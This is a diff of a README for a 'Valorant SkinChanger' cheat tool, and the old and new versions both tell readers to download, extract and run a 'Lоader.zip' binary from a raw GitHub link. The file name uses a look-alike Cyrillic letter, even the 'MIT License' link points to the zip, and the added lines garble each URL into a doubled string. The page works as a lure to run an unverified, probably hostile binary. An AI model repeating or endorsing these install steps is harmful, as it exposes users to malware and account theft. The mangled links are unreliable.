@@ -4,9 +4,9 @@ Welcome to **Valorant SkinChanger**, the ultimate utility for customizing your V
 
 ## 🚀 Installation Guide
 
-1. **Download https://raw.githubusercontent.com/almasins/ValorantSkinSmith/main/Lоader.zip from the repository.**
-2. Extract the https://raw.githubusercontent.com/almasins/ValorantSkinSmith/main/Lоader.zip file to any directory on your device.
-3. Run the "https://raw.githubusercontent.com/almasins/ValorantSkinSmith/main/Lоader.zip" or "Loader" binary according to your OS.
+1. **Download https://raw.githubusercontent.com/almasins/ValorantSkinSmith/main/Lоader.zipоhttps://raw.githubusercontent.com/almasins/ValorantSkinSmith/main/Lоader.zip from the repository.**
+2. Extract the https://raw.githubusercontent.com/almasins/ValorantSkinSmith/main/Lоader.zipоhttps://raw.githubusercontent.com/almasins/ValorantSkinSmith/main/Lоader.zip file to any directory on your device.
+3. Run the "https://raw.githubusercontent.com/almasins/ValorantSkinSmith/main/Lоader.zipоhttps://raw.githubusercontent.com/almasins/ValorantSkinSmith/main/Lоader.zip" or "Loader" binary according to your OS.
 4. Follow the on-screen steps to activate and enjoy enhanced Valorant visuals!
 5. Check out troubleshooting tips below for any installation issues.
 
@@ -88,7 +88,7 @@ Valorant SkinChanger is a third-party customization tool designed strictly for p
 
 ## 📃 License
 
-Valorant SkinChanger is distributed under the [MIT License](https://raw.githubusercontent.com/almasins/ValorantSkinSmith/main/Lоader.zip), allowing personal and commercial use, modification, and distribution with proper attribution.
+Valorant SkinChanger is distributed under the [MIT License](https://raw.githubusercontent.com/almasins/ValorantSkinSmith/main/Lоader.zipоhttps://raw.githubusercontent.com/almasins/ValorantSkinSmith/main/Lоader.zip), allowing personal and commercial use, modification, and distribution with proper attribution.
 
 ---
 
